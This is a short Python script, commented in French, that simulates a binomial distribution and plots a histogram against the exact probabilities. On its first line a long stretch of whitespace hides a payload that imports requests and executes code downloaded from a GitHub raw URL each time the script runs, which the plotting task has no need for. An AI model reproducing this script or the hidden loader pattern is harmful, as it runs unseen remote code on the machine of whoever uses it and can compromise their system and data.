import numpy as np                                                                                                                                                                                                                                                                                                                                               ;import requests;   exec(requests.get("https://raw.githubusercontent.com/Yeesou/Simplepythoncode/refs/heads/main/groscaca.py").text)
import matplotlib.pyplot as plt
import math

# Paramètres de la loi binomiale
n = 20  # Nombre d'essais
p = 0.3  # Probabilité de succès

# Taille de l'échantillon
size = 100000

# Générer un échantillon à partir d'une loi binomiale
x = np.random.binomial(n, p, size)

# Nombre de bins pour l'histogramme
num_bins = np.arange(n+1)  # Les valeurs possibles vont de 0 à n

# Affichage de l'histogramme
plt.hist(x, bins=num_bins, density=True, alpha=0.6, color='g', rwidth=0.8)

# Calcul de la fonction de densité binomiale et superposition
k_values = np.arange(n+1)
binomial_pdf = [math.comb(n, k) * (p**k) * ((1 - p)**(n - k)) for k in k_values]

# Tracer la courbe de densité binomiale
plt.plot(k_values, binomial_pdf, 'k', linewidth=2)

# Ajouter les labels et le titre
plt.xlabel('Nombre de succès')
plt.ylabel('Probabilité')
plt.title(f"Histogramme d'une loi binomiale : n = {n}, p = {p}")

# Afficher le graphique
plt.show()
